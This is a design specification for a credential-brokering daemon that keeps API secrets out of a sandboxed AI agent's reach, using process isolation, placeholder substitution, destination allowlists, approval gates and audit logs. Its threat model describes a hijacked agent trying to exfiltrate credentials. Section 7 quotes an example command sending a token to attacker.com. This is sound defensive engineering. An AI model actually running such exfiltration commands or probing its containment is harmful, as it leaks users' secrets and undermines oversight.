# Local Agent Keychain — Design Specification

## 1. Goals and non-goals

**Goals.** Let an agent process on a host make authenticated HTTP requests to approved upstream APIs without ever holding the credentials in its memory, environment, filesystem, or context window. Make credential exfiltration require breaking OS-level isolation, not prompt-level isolation. Provide a clear, narrow interface so the keychain itself stays small and auditable.

**Non-goals.** This spec does not attempt to prevent an authorized agent from misusing its legitimate capabilities (sending allowed requests with malicious payloads). That is a capability-scoping and human-approval problem, addressed at a layer above. It also does not replace a secrets-at-rest manager (Vault, 1Password, AWS Secrets Manager); the keychain pulls from one of those at startup or on demand.

## 2. Threat model

The trusted components are the host kernel, the keychain daemon's binary and config, and the user/admin operating them. The untrusted components are the agent process, anything the agent spawns, anything the agent can write to disk, and any content the agent ingests (web pages, tool outputs, documents, prior conversation).

The attacker is assumed to have full control of the agent process — arbitrary code execution as the agent's uid, ability to read the agent's memory, env, filesystem, and to make arbitrary syscalls within whatever sandbox the agent is in. The attacker cannot escalate privileges, escape the sandbox, or compromise the kernel.

In-scope attacks: reading credentials from agent memory or env; reading the keychain's vault file; `ptrace`-ing the keychain daemon; tricking the daemon into sending a credential to an attacker-controlled host; replaying a captured request; smuggling a credential into a response body the agent can read.

Out of scope: kernel exploits, sandbox escapes, hardware side channels, supply-chain compromise of the keychain binary itself, physical access.

## 3. Architecture overview

Three components on one host:

1. **Keychain daemon (`keychaind`).** Long-running process owned by a dedicated system user (`keychain`). Holds the credential vault in memory, talks to a backing store at startup, and exposes one Unix domain socket.
2. **Agent sandbox.** The agent runs as a different uid (`agent`), inside a container or `bubblewrap` jail. Its only path to the network for protected destinations is the daemon's socket, bind-mounted in.
3. **Backing store.** Anything that can hand the daemon plaintext credentials over a mutually authenticated channel: HashiCorp Vault, AWS Secrets Manager, a `0400` file owned by `keychain`, or a hardware token. The daemon authenticates to the backing store using a credential the agent cannot read (e.g., a workload identity, a TPM-sealed token, or just file ownership).

The daemon never returns a credential value to the agent. It only forwards HTTP requests with credentials substituted in transit.

```
┌─────────────────────────────┐         ┌──────────────────────────────┐
│   Agent sandbox (uid=agent) │         │  keychaind (uid=keychain)    │
│                             │         │                              │
│   agent process             │ socket  │   policy engine              │
│   ──────────────────────►   │ ──────► │   credential vault (mem)     │
│   sends HTTP-shaped request │         │   request forwarder ──────►  │  Internet
│   with {{PLACEHOLDERS}}     │ ◄────── │   (TLS to upstream)          │
│   reads response body       │ resp    │                              │
└─────────────────────────────┘         └──────────────────────────────┘
                                                  │
                                                  │ pulls at startup
                                                  ▼
                                         ┌────────────────────┐
                                         │  Backing store     │
                                         │  (Vault / file /   │
                                         │   TPM / cloud SM)  │
                                         └────────────────────┘
```

## 4. Process and filesystem isolation

The daemon runs as a dedicated uid that the agent does not share. The vault file, if one exists on disk, is mode `0400`, owned by `keychain:keychain`, and ideally on a tmpfs that the daemon `mlock`s into memory so it does not page to swap.

The daemon enables `PR_SET_DUMPABLE=0` (or the platform equivalent) so the agent cannot `ptrace` it or read `/proc/<pid>/mem` even if uids matched. On systemd, the unit sets `ProtectSystem=strict`, `ProtectHome=true`, `PrivateTmp=true`, `NoNewPrivileges=true`, `SystemCallFilter=@system-service`, and drops all capabilities.

The agent runs in a sandbox (container, `bubblewrap`, or VM) with no network access except through the daemon's socket and any explicitly allowed unprotected destinations. The socket lives at `/run/keychaind/sock` and is bind-mounted read-write into the sandbox; nothing else from `/run/keychaind/` is visible inside.

This is the meaningful isolation boundary. Without separate uids and a sandboxed agent, the daemon is just a library and provides no protection.

## 5. Socket protocol

The agent talks to the daemon over a Unix domain socket using a small line-delimited JSON protocol. HTTP-over-Unix-socket would also work and is friendlier to existing libraries; the choice is cosmetic. The socket has mode `0660`, group `agent`, so any process the agent spawns under its own uid can connect, and nothing else on the host can.

The daemon authenticates the peer via `SO_PEERCRED` (Linux) or equivalent and records the peer pid and uid in every audit entry. There is no shared secret or token; OS-level peer credentials are the auth.

A request looks like:

```json
{
  "method": "POST",
  "url": "https://api.github.com/repos/acme/widgets/issues",
  "headers": {
    "Authorization": "Bearer {{github.oauth.access_token}}",
    "Content-Type": "application/json"
  },
  "body": "{\"title\":\"bug\",\"body\":\"...\"}"
}
```

A response is the upstream HTTP response, optionally with headers redacted by policy (see §7). The daemon never returns the substituted credential and never echoes the resolved URL back to the agent in a way that includes a credential.

Placeholders use the form `{{namespace.key}}`. Namespaces correspond to credential bindings in the policy file; keys correspond to fields within a binding (e.g., `access_token`, `refresh_token`, `api_key`). Unknown placeholders cause the request to be rejected, not forwarded with the literal string intact — silent passthrough is a footgun.

## 6. Credential model

A credential binding looks like:

```yaml
credentials:
  github.oauth:
    type: oauth2
    backing_store: vault://secret/data/github
    refresh:
      endpoint: https://github.com/login/oauth/access_token
      client_id_ref: vault://secret/data/github#client_id
      client_secret_ref: vault://secret/data/github#client_secret
    fields: [access_token, refresh_token]
  stripe.live:
    type: api_key
    backing_store: file:///etc/keychaind/stripe.key
    fields: [api_key]
```

The daemon loads bindings at startup, fetches values, and holds them in `mlock`ed memory. OAuth refresh happens inside the daemon: on a 401 from upstream, the daemon attempts refresh using credentials it pulls fresh from the backing store, retries the request once, and if refresh fails returns a structured error (`{"error":"reauth_required","reauth_url":"..."}`) to the agent. The agent never sees refresh tokens or client secrets even transiently.

Credentials are never written to logs, never returned in responses, and never substituted into anything other than outgoing requests to allowed destinations.

## 7. Policy engine

Every request passes through a policy check before substitution. The policy file is the most security-critical artifact and should be small, declarative, and reviewed:

```yaml
policies:
  - id: github-issues
    credential: github.oauth
    allow:
      - method: [GET, POST, PATCH]
        host: api.github.com
        path_prefix: /repos/acme/
    deny_response_headers: [set-cookie, www-authenticate]
    rate_limit: 60/min
    require_approval: false

  - id: stripe-readonly
    credential: stripe.live
    allow:
      - method: GET
        host: api.stripe.com
    rate_limit: 30/min
    require_approval: false

  - id: stripe-writes
    credential: stripe.live
    allow:
      - method: [POST, DELETE]
        host: api.stripe.com
    require_approval: true
    approval_timeout: 120s
```

The four checks that matter:

**Destination binding.** A credential is only ever substituted into a request whose host (and optionally path prefix) matches an allow rule for that credential. This is what defends against the `keychain curl https://attacker.com -H "Authorization: Bearer {{token}}"` attack — the daemon refuses to substitute a GitHub token into a request not bound for `api.github.com`.

**Method and path scoping.** Read-only credentials should only ride GET requests; destructive operations require a separate, narrower binding. This limits blast radius if the agent is hijacked.

**Response filtering.** Some upstreams reflect auth headers in error bodies or set cookies that contain session material. The daemon strips configured response headers and can optionally regex-scrub response bodies, though body scrubbing is best-effort and should not be relied on.

**Approval gating.** High-risk operations (`require_approval: true`) cause the daemon to block the request and emit an approval prompt to a separate channel — a desktop notification, a CLI prompt on the user's terminal, a webhook to a phone. The agent receives `202 Accepted` with a request id and polls or long-polls for the result. Approvals are one-shot and expire.

## 8. Audit log

Every decision is logged: timestamp, peer pid and uid, request method and URL, matched policy id, decision (allow/deny/approval-pending), upstream status code, byte counts, latency. Bodies are not logged by default; headers are logged with `Authorization` and `Cookie` redacted. The log is append-only, owned by `keychain:keychain`, mode `0640`, and shipped to a central collector. The agent cannot read it.

This is non-optional. The whole point of the architecture is that the daemon is the chokepoint; if you can't see what flowed through it, you've thrown away half the value.

## 9. Lifecycle and key rotation

The daemon supports `SIGHUP` to reload policy without dropping in-flight requests and a `rotate` admin command (over a separate admin socket, mode `0600`, owned by `keychain`) to refetch a credential from the backing store. Rotation invalidates any cached refreshed tokens.

The daemon shuts down cleanly on `SIGTERM`, zeroing credential memory before exit (best-effort; this is hard to guarantee in garbage-collected languages, which is why the daemon should be written in Rust, Go, or C with explicit zeroization).

On startup, if the backing store is unreachable, the daemon fails closed: it starts but rejects all requests with `503 backing_store_unavailable` rather than serving stale credentials it can't verify are current.

## 10. Failure modes the spec deliberately accepts

**The agent can use credentials it's authorized to use.** If `github-issues` is allowed, a hijacked agent can open spam issues. Mitigations live above this layer (approval gating for destructive operations, capability scoping, human review of generated content).

**The agent can probe what's allowed.** It can enumerate which placeholders work and which destinations succeed. This is recon, not credential leakage, and is acceptable.

**Upstream APIs that reflect credentials are partially mitigated.** Header redaction handles the common case; a determined upstream that returns the token in a JSON body will defeat this. The right answer is to not use such APIs with this keychain, or to add a per-policy response-body scrubber.

**A compromised daemon defeats everything.** This is why the daemon binary should be minimal, statically linked, signed, and ideally written in a memory-safe language. The attack surface is the socket protocol, the policy parser, and the HTTP client. Keep all three boring.

**A compromised host defeats everything.** Out of scope, as stated.

## 11. Minimal viable implementation

For a first version, the smallest thing worth building:

- Single binary in Rust or Go, ~2–3k lines.
- Unix socket, line-delimited JSON, `SO_PEERCRED` auth.
- Credentials loaded from a `0400` YAML file at startup; no Vault integration yet.
- Policy file with host allowlist, method allowlist, and a global rate limit.
- Audit log to stdout in JSON, redirected by systemd.
- No OAuth refresh; API keys only.
- No approval gating; allow or deny.

That gets you the core property — credentials never enter the agent's address space — and is small enough to audit in an afternoon. OAuth, approval flows, and Vault integration are additions, not foundations. Build the foundation first and resist the temptation to make it clever.

